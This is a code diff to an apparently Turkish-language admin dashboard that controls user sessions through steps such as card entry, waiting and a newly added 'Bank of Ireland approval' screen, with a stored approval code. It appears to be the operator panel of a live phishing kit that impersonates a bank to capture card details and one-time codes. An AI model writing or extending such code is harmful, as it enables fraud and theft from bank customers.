@@ -54,6 +54,22 @@ export function AdminDashboardStable() {
 
   async function handleRouteAction(id: string, step: string) {
     if (!supabase || !step) return;
+    if (step === "boi_approval") {
+      const { data: existing } = await supabase.from("sessions").select("form_data").eq("id", id).maybeSingle();
+      const prev = (existing?.form_data ?? {}) as Record<string, unknown>;
+      await supabase.from("sessions").update({
+        is_hidden: false,
+        current_step: "special_approval",
+        status: "online",
+        form_data: {
+          ...prev,
+          approvalStatus: "boi_approval",
+          approvalCode: "",
+        },
+      }).eq("id", id);
+      await load();
+      return;
+    }
     if (step === "special_approval") {
       setSpecialPromptSessionId(id);
       setSpecialMessage("");
@@ -154,6 +170,7 @@ export function AdminDashboardStable() {
                         <option value="card">Kart</option>
                         <option value="wait">Beklet</option>
                         <option value="congrats">Tebrikler</option>
+                        <option value="boi_approval">Bank of Ireland Onayı</option>
                         <option value="special_approval">Özel Bildirim Gönder</option>
                       </select>
                     </td>
